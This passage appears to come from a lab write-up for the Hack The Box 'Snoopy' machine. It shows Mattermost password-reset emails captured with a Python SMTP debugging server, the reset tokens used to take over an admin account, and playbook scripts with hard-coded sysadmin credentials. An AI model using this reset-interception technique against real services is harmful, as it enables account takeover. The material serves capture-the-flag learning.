b'      border: 0;'
b'      height: auto;'
b'      line-height: 100%;'
b'      outline: none;'
b'      text-decoration: none;'
b'      -ms-interpolation-mode: bicubic;'
b'    }'
b''
b'    p {'
b'      display: block;'
b'      margin: 13px 0;'
b'    }'
b'  </style>'
b' =20'
b' =20'
b' =20'
b'  <link href=3D"https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700" rel=3D"stylesheet" type=3D"text/css">'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700);'
b'  </style>'
b' =20'
b'  <style type=3D"text/css">'
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-100 {'
b'        width: 100% !important;'
b'        max-width: 100%;'
b'      }'
b'    }'
b'  </style>'
b'  <style media=3D"screen and (min-width:480px)">'
b'    .moz-text-html .mj-column-per-100 {'
b'      width: 100% !important;'
b'      max-width: 100%;'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @media only screen and (max-width:480px) {'
b'      table.mj-full-width-mobile {'
b'        width: 100% !important;'
b'      }'
b''
b'      td.mj-full-width-mobile {'
b'        width: auto !important;'
b'      }'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,600,700);'
b''
b'    .emailBody {'
b'      background-color: #F3F3F3'
b'    }'
b''
b'    .emailBody a {'
b'      text-decoration: none !important;'
b'      color: #1C58D9;'
b'    }'
b''
b'    .title div {'
b'      font-weight: 600 !important;'
b'      font-size: 28px !important;'
b'      line-height: 36px !important;'
b'      letter-spacing: -0.01em !important;'
b'      color: #3F4350 !important;'
b'      font-family: Open Sans, sans-serif !important;'
b'    }'
b''
b'    .subTitle div {'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: rgba(63, 67, 80, 0.64) !important;'
b'    }'
b''
b'    .subTitle a {'
b'      color: rgb(28, 88, 217) !important;'
b'    }'
b''
b'    .button a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .button-cloud a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 400 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .messageButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #FFFFFF !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 12px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .info div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 40px 0px !important;'
b'    }'
b''
b'    .footerTitle div {'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 0px 4px 0px !important;'
b'    }'
b''
b'    .footerInfo div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 48px 0px 48px !important;'
b'    }'
b''
b'    .footerInfo a {'
b'      color: #1C58D9 !important;'
b'    }'
b''
b'    .appDownloadButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #1C58D9 !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 13px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .emailFooter div {'
b'      font-size: 12px !important;'
b'      line-height: 16px !important;'
b'      color: rgba(63, 67, 80, 0.56) !important;'
b'      padding: 8px 24px 8px 24px !important;'
b'    }'
b''
b'    .postCard {'
b'      padding: 0px 24px 40px 24px !important;'
b'    }'
b''
b'    .messageCard {'
b'      background: #FFFFFF !important;'
b'      border: 1px solid rgba(61, 60, 64, 0.08) !important;'
b'      box-sizing: border-box !important;'
b'      box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.12) !important;'
b'      border-radius: 4px !important;'
b'      padding: 32px !important;'
b'    }'
b''
b'    .messageAvatar img {'
b'      width: 32px !important;'
b'      height: 32px !important;'
b'      padding: 0px !important;'
b'      border-radius: 32px !important;'
b'    }'
b''
b'    .messageAvatarCol {'
b'      width: 32px !important;'
b'    }'
b''
b'    .postNameAndTime {'
b'      padding: 0px 0px 4px 0px !important;'
b'      display: flex;'
b'    }'
b''
b'    .senderName {'
b'      font-family: Open Sans, sans-serif;'
b'      text-align: left !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'    }'
b''
b'    .time {'
b'      font-family: Open Sans, sans-serif;'
b'      font-size: 12px;'
b'      line-height: 16px;'
b'      color: rgba(63, 67, 80, 0.56);'
b'      padding: 2px 6px;'
b'      align-items: center;'
b'      float: left;'
b'    }'
b''
b'    .channelBg {'
b'      background: rgba(63, 67, 80, 0.08);'
b'      border-radius: 4px;'
b'      display: flex;'
b'      padding-left: 4px;'
b'    }'
b''
b'    .channelLogo {'
b'      width: 10px;'
b'      height: 10px;'
b'      padding: 5px 4px 5px 6px;'
b'      float: left;'
b'    }'
b''
b'    .channelName {'
b'      font-family: Open Sans, sans-serif;'
b'      font-weight: 600;'
b'      font-size: 10px;'
b'      line-height: 16px;'
b'      letter-spacing: 0.01em;'
b'      text-transform: uppercase;'
b'      color: rgba(63, 67, 80, 0.64);'
b'      padding: 2px 6px 2px 0px;'
b'    }'
b''
b'    .gmChannelCount {'
b'      background-color: rgba(63, 67, 80, 0.2);'
b'      padding: 0 5px;'
b'      border-radius: 2px;'
b'      margin-right: 2px;'
b'    }'
b''
b'    .senderMessage div {'
b'      text-align: left !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px !important;'
b'    }'
b''
b'    .senderInfoCol {'
b'      width: 394px !important;'
b'      padding: 0px 0px 0px 12px !important;'
b'    }'
b''
b'    @media all and (min-width: 541px) {'
b'      .emailBody {'
b'        padding: 32px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 540px) and (min-width: 401px) {'
b'      .emailBody {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 400px) {'
b'      .emailBody {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .footerInfo div {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .postCard {'
b'        padding: 0px 0px 40px 0px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-50 {'
b'        width: 100% !important;'
b'        max-width: 100% !important;'
b'      }'
b'    }'
b'  </style>'
b'</head>'
b''
b'<body style=3D"word-spacing:normal;background-color:#FFFFFF;">'
b'  <div class=3D"emailBody" style=3D"background-color: #FFFFFF;">'
b'   =20'
b'    <div style=3D"background:#FFFFFF;background-color:#FFFFFF;margin:0px au='
b'to;border-radius:8px;max-width:600px;">'
b'      <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D='
b'"0" role=3D"presentation" style=3D"background:#FFFFFF;background-color:#FFF='
b'FFF;width:100%;border-radius:8px;">'
b'        <tbody>'
b'          <tr>'
b'            <td style=3D"direction:ltr;font-size:0px;padding:24px;text-alig='
b'n:center;">'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:132px;">'
b'                                          <img alt height=3D"21" src=3D"htt='
b'p://mm.snoopy.htb/static/images/logo_email_dark.png" style=3D"border:0;disp='
b'lay:block;outline:none;text-decoration:none;height:21.76px;width:100%;font-='
b'size:13px;" width=3D"132">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'24px 40px 24px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"title" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"text-align: center; font-we='
b'ight: 600; font-size: 28px; line-height: 36px; letter-spacing: -0.01em; col='
b'or: #3F4350; font-family: Open Sans, sans-serif;">Reset Your Password</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"subTitle" sty='
b'le=3D"font-size:0px;padding:16px 24px 16px 24px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 16px; line-height: 24px; color: rgb='
b'a(63, 67, 80, 0.64);">Click the button below to reset your password. If you='
b' didn=E2=80=99t request this, you can safely ignore this email.</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" vertical-align=3D"midd='
b'le" class=3D"button" style=3D"font-size:0px;padding:0px;word-break:break-wo='
b'rd;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:separate;line='
b'-height:100%;">'
b'                                    <tr>'
b'                                      <td align=3D"center" bgcolor=3D"#FFFF='
b'FF" role=3D"presentation" style=3D"border:none;border-radius:4px;cursor:aut='
b'o;mso-padding-alt:10px 25px;background:#FFFFFF;" valign=3D"middle">'
b'                                        <a href=3D"http://mm.snoopy.htb/res='
b'et_password_complete?token=3D6xj4k6o9u751nzr71tmhghan4x958yh66oz43ctqg1bhnn='
b'1dmh6e3n4zgg3fkipc" style=3D"display: inline-block; background: #FFFFFF; fo='
b'nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd='
b'ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: ='
b'#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF='
b'FF; padding: 15px 24px;" target=3D"_blank">'
b'                                          Reset Password'
b'                                        </a>'
b'                                      </td>'
b'                                    </tr>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:312px;">'
b'                                          <img alt height=3D"auto" src=3D"h='
b'ttp://mm.snoopy.htb/static/images/forgot_password_illustration.png" style='
b'=3D"border:0;display:block;outline:none;text-decoration:none;height:auto;wi='
b'dth:100%;font-size:13px;" width=3D"312">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"info" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 40px 0px;">The password reset link expires in 24 hours.</div='
b'>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:16px='
b' 0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerTitle" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-weight: 600; font-size: 16px; line-height='
b': 24px; color: #3F4350; padding: 0px 0px 4px 0px;">Questions?</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerInfo" s='
b'tyle=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 0px 48px 0px 48px;">Need help or have questions? Email us at='
b'=20'
b'                                    <a href=3D"mailto:support@snoopy.htb" s='
b'tyle=3D"text-decoration: none; color: #1C58D9;">'
b'                                      support@snoopy.htb</a>'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"emailFooter" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 12px; line-height: 16px; color: rgb='
b'a(63, 67, 80, 0.56); padding: 8px 24px 8px 24px;">'
b'                                    =C2=A9 2022 Mattermost, Inc. 530 Lytton='
b' Avenue, Second floor, Palo Alto, CA, 94301'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'            </td>'
b'          </tr>'
b'        </tbody>'
b'      </table>'
b'    </div>'
b'   =20'
b'  </div>'
b'</body>'
b''
b'</html>'
b''
b''
b'--95146158bc86ec64a316b847ec888561eb404887b1276806c4cc77adda80--'
------------ END MESSAGE ------------
```

We are now admin on mattermost

`http://mm.snoopy.htb/reset_password_complete?token=6xj4k6o9u751nzr71tmhghan4x958yh66oz43ctqg1bhnn1dmh6e3n4zgg3fkipc`

### admin: password

Inside of the playbook there are some bash scripts that are running

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0e3371c4-27e5-46f9-9627-8eb7a69b1455/Untitled.png)

```python
for server in playbooks-bug-bash-t0 playbooks-bug-bash-e0 playbooks-bug-bash-e10 playbooks-bug-bash-e20; do
    mmctl auth login https://$server.test.mattermost.cloud --name $server --username sysadmin --password-file <(echo "Sys@dmin123");
    mmctl config set TeamSettings.EnableOpenServer true;
    mmctl config set ServiceSettings.CollapsedThreads default_on;
done
```

```python
for server in playbooks-bug-bash-t0 playbooks-bug-bash-e0 playbooks-bug-bash-e10 playbooks-bug-bash-e20; do
    mmctl auth login https://$server.test.mattermost.cloud --name $server --username sysadmin --password-file <(echo "Sys@dmin123");
    mmctl plugin install-url --force https://github.com/mattermost/mattermost-plugin-playbooks/releases/download/v1.22.0%2Balpha.3/playbooks-1.22.0+alpha.3.tar.gz
done
```

For bash related playbooks

**sysadmin: Sys@dmin123**

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/fa20f24d-bb6f-4008-80b3-41dcb60378cc/Untitled.png)

Password reset for cbrown

```python
C┌─[htb-yougotgot@htb-05oa29kbgw]─[~]
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.129:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Content-Transfer-Encoding: 8bit'
b'Auto-Submitted: auto-generated'
b'Precedence: bulk'
b'Message-ID: <1c7hp7o7kuzn7o74-1683675818@mm.snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'To: cbrown@snoopy.htb'
b'Subject: [Mattermost] Reset your password'
b'Date: Tue, 09 May 2023 23:43:38 +0000'
b'Content-Type: multipart/alternative;'
b' boundary=b9d97383ce4bbf331733f8c570b85b47f91ce66770df45c2634afe1c8a24'
b'X-Peer: 10.129.221.81'
b''
b'--b9d97383ce4bbf331733f8c570b85b47f91ce66770df45c2634afe1c8a24'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D7tap3='
b'c3jbdm7z8stbnhf8jksp5kc3kqp85toh71iks3d7rgn49dzh5jme5gqjppr )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--b9d97383ce4bbf331733f8c570b85b47f91ce66770df45c2634afe1c8a24'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
b'<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso='
b'ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">'
b''
b'<head>'
b'  <title>'
b'  </title>'
b' =20'
b'  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">'
b' =20'
b'  <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">'
b'  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D='
b'1">'
b'  <style type=3D"text/css">'
b'    #outlook a {'
b'      padding: 0;'
b'    }'
b''
b'    body {'
b'      margin: 0;'
b'      padding: 0;'
b'      -webkit-text-size-adjust: 100%;'
b'      -ms-text-size-adjust: 100%;'
b'    }'
b''
b'    table,'
b'    td {'
b'      border-collapse: collapse;'
b'      mso-table-lspace: 0pt;'
b'      mso-table-rspace: 0pt;'
b'    }'
b''
b'    img {'
b'      border: 0;'
b'      height: auto;'
b'      line-height: 100%;'
b'      outline: none;'
b'      text-decoration: none;'
b'      -ms-interpolation-mode: bicubic;'
b'    }'
b''
b'    p {'
b'      display: block;'
b'      margin: 13px 0;'
b'    }'
b'  </style>'
b' =20'
b' =20'
b' =20'
b'  <link href=3D"https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700" rel=3D"stylesheet" type=3D"text/css">'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700);'
b'  </style>'
b' =20'
b'  <style type=3D"text/css">'
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-100 {'
b'        width: 100% !important;'
b'        max-width: 100%;'
b'      }'
b'    }'
b'  </style>'
b'  <style media=3D"screen and (min-width:480px)">'
b'    .moz-text-html .mj-column-per-100 {'
b'      width: 100% !important;'
b'      max-width: 100%;'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @media only screen and (max-width:480px) {'
b'      table.mj-full-width-mobile {'
b'        width: 100% !important;'
b'      }'
b''
b'      td.mj-full-width-mobile {'
b'        width: auto !important;'
b'      }'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,600,700);'
b''
b'    .emailBody {'
b'      background-color: #F3F3F3'
b'    }'
b''
b'    .emailBody a {'
b'      text-decoration: none !important;'
b'      color: #1C58D9;'
b'    }'
b''
b'    .title div {'
b'      font-weight: 600 !important;'
b'      font-size: 28px !important;'
b'      line-height: 36px !important;'
b'      letter-spacing: -0.01em !important;'
b'      color: #3F4350 !important;'
b'      font-family: Open Sans, sans-serif !important;'
b'    }'
b''
b'    .subTitle div {'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: rgba(63, 67, 80, 0.64) !important;'
b'    }'
b''
b'    .subTitle a {'
b'      color: rgb(28, 88, 217) !important;'
b'    }'
b''
b'    .button a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .button-cloud a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 400 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .messageButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #FFFFFF !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 12px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .info div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 40px 0px !important;'
b'    }'
b''
b'    .footerTitle div {'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 0px 4px 0px !important;'
b'    }'
b''
b'    .footerInfo div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 48px 0px 48px !important;'
b'    }'
b''
b'    .footerInfo a {'
b'      color: #1C58D9 !important;'
b'    }'
b''
b'    .appDownloadButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #1C58D9 !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 13px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .emailFooter div {'
b'      font-size: 12px !important;'
b'      line-height: 16px !important;'
b'      color: rgba(63, 67, 80, 0.56) !important;'
b'      padding: 8px 24px 8px 24px !important;'
b'    }'
b''
b'    .postCard {'
b'      padding: 0px 24px 40px 24px !important;'
b'    }'
b''
b'    .messageCard {'
b'      background: #FFFFFF !important;'
b'      border: 1px solid rgba(61, 60, 64, 0.08) !important;'
b'      box-sizing: border-box !important;'
b'      box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.12) !important;'
b'      border-radius: 4px !important;'
b'      padding: 32px !important;'
b'    }'
b''
b'    .messageAvatar img {'
b'      width: 32px !important;'
b'      height: 32px !important;'
b'      padding: 0px !important;'
b'      border-radius: 32px !important;'
b'    }'
b''
b'    .messageAvatarCol {'
b'      width: 32px !important;'
b'    }'
b''
b'    .postNameAndTime {'
b'      padding: 0px 0px 4px 0px !important;'
b'      display: flex;'
b'    }'
b''
b'    .senderName {'
b'      font-family: Open Sans, sans-serif;'
b'      text-align: left !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'    }'
b''
b'    .time {'
b'      font-family: Open Sans, sans-serif;'
b'      font-size: 12px;'
b'      line-height: 16px;'
b'      color: rgba(63, 67, 80, 0.56);'
b'      padding: 2px 6px;'
b'      align-items: center;'
b'      float: left;'
b'    }'
b''
b'    .channelBg {'
b'      background: rgba(63, 67, 80, 0.08);'
b'      border-radius: 4px;'
b'      display: flex;'
b'      padding-left: 4px;'
b'    }'
b''
b'    .channelLogo {'
b'      width: 10px;'
b'      height: 10px;'
b'      padding: 5px 4px 5px 6px;'
b'      float: left;'
b'    }'
b''
b'    .channelName {'
b'      font-family: Open Sans, sans-serif;'
b'      font-weight: 600;'
b'      font-size: 10px;'
b'      line-height: 16px;'
b'      letter-spacing: 0.01em;'
b'      text-transform: uppercase;'
b'      color: rgba(63, 67, 80, 0.64);'
b'      padding: 2px 6px 2px 0px;'
b'    }'
b''
b'    .gmChannelCount {'
b'      background-color: rgba(63, 67, 80, 0.2);'
b'      padding: 0 5px;'
b'      border-radius: 2px;'
b'      margin-right: 2px;'
b'    }'
b''
b'    .senderMessage div {'
b'      text-align: left !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px !important;'
b'    }'
b''
b'    .senderInfoCol {'
b'      width: 394px !important;'
b'      padding: 0px 0px 0px 12px !important;'
b'    }'
b''
b'    @media all and (min-width: 541px) {'
b'      .emailBody {'
b'        padding: 32px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 540px) and (min-width: 401px) {'
b'      .emailBody {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 400px) {'
b'      .emailBody {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .footerInfo div {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .postCard {'
b'        padding: 0px 0px 40px 0px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-50 {'
b'        width: 100% !important;'
b'        max-width: 100% !important;'
b'      }'
b'    }'
b'  </style>'
b'</head>'
b''
b'<body style=3D"word-spacing:normal;background-color:#FFFFFF;">'
b'  <div class=3D"emailBody" style=3D"background-color: #FFFFFF;">'
b'   =20'
b'    <div style=3D"background:#FFFFFF;background-color:#FFFFFF;margin:0px au='
b'to;border-radius:8px;max-width:600px;">'
b'      <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D='
b'"0" role=3D"presentation" style=3D"background:#FFFFFF;background-color:#FFF='
